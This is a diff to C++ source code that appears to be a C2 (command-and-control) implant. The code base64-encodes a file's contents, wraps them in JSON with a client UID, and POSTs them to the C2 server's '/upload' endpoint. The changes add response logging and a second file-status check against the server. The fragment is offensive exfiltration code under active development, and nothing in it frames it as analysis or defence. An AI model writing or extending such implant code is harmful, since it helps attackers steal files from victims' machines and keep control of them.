@@ -112,11 +112,17 @@ int main() {
         // Construct a JSON object that contains the encoded file bytes and the client's UID:
         nlohmann::json EncodedBytes; 
         EncodedBytes["file_data"] = base64Encoded;
-        EncodedBytes["uid"] = uid;
+        EncodedBytes["uid"] = WStringToString(uid);
 
         // Upload the requested bytes to the server:
         std::wstring FileUploadURL = C2 + L"/upload";
-        std::string response = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
+        std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
+        std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
+
+        // Check file status after the first bytes upload:
+        std::string SecondFileCheck = SendData(L"POST", FileStatusURL, L"", UidJson, L""); 
+        auto SecondJSON = nlohmann::json::parse(SecondFileCheck);
+        std::cout << "JSON response: " << SecondJSON << std::endl;
     }
 
     return 0;
